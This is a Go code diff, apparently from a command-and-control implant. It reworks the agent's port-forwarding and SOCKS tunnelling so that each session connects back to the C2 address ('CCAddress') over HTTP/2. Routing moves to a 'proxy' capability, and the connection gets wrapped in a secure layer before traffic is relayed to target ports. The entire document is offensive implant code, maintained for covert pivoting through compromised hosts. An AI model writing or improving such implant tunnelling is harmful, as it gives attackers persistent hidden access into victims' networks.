@@ -91,35 +91,26 @@ func Socks5Proxy(op string, addr string) (err error) {
 	return err
 }
 
-// PortFwd port mapping, receive request data then send it to target port on remote address
-// addr: when reversed, addr should be port
+// BuildPortFwdURL returns the single C2 endpoint URL for port forwarding.
+// Routing is determined by the CBOR MsgAuth "proxy" capability, not the URL path.
 func BuildPortFwdURL(sessionID string) (string, error) {
-	prefix := common.RuntimeConfig.C2Prefix
-	proxyPath := common.RuntimeConfig.ProxyPath
-	if prefix == "" || proxyPath == "" {
-		return "", fmt.Errorf("missing server config: Prefix=%q ProxyPath=%q", prefix, proxyPath)
-	}
 	if def.CCAddress == "" {
 		return "", errors.New("missing CCAddress")
 	}
-	return fmt.Sprintf("%s/%s/%s/%s", def.CCAddress, prefix, proxyPath, sessionID), nil
+	// sessionID is included so the server can correlate the stream to a session.
+	// It is NOT used for routing (that's done by CBOR MsgAuth capability).
+	return fmt.Sprintf("%s/?session=%s", def.CCAddress, sessionID), nil
 }
 
 func PortFwd(addr, sessionID, protocol string, reverse bool, timeout int) (err error) {
 	var (
 		session PortFwdSession
-		url     string
 
 		// connection
 		conn   *h2conn.Conn
 		ctx    context.Context
 		cancel context.CancelFunc
 	)
-
-	url, err = BuildPortFwdURL(sessionID)
-	if err != nil {
-		return err
-	}
 
 	if !netutil.ValidateIPPort(addr) && !reverse {
 		return fmt.Errorf("invalid address: %s", addr)
@@ -131,19 +122,21 @@ func PortFwd(addr, sessionID, protocol string, reverse bool, timeout int) (err e
 		logging.Infof("PortFwd (reversed) started: %s (%s)", addr, sessionID)
 		go listenAndFwd(ctx, cancel, addr, sessionID) // here addr is a port number to listen on
 	} else {
-		conn, ctx, cancel, err = c2transport.EstablishC2Connection(url)
+		conn, ctx, cancel, err = c2transport.EstablishC2Connection(def.CCAddress, sessionID, common.RuntimeConfig.C2Routes.Proxy)
 		if err != nil {
 			return fmt.Errorf("failed to connect to CC: %v", err)
 		}
 		logging.Infof("PortFwd (%s) started: %s (%s)", protocol, addr, sessionID)
-		go transport.FwdToDport(ctx, cancel, addr, sessionID, protocol, conn, timeout)
+		
+		secureConn := transport.NewSecureConn(conn)
+		go transport.FwdToDport(ctx, cancel, addr, sessionID, protocol, secureConn, timeout)
 	}
 
 	// remember to cleanup
 	defer func() {
 		cancel()
 		if conn != nil {
-			conn.Close()
+			conn.Close() // Underlying net.Conn handles the close
 		}
 
 		PortFwds.Delete(sessionID)
@@ -188,7 +181,7 @@ func listenAndFwd(ctx context.Context, cancel context.CancelFunc,
 		}
 
 		// start a h2 connection per incoming TCP connection
-		h2, _, h2cancel, err := c2transport.EstablishC2Connection(url)
+		h2, _, h2cancel, err := c2transport.EstablishC2Connection(url, shID, common.RuntimeConfig.C2Routes.Proxy)
 		if err != nil {
 			logging.Infof("h2conn (%s) failed: %v", url, err)
 			return
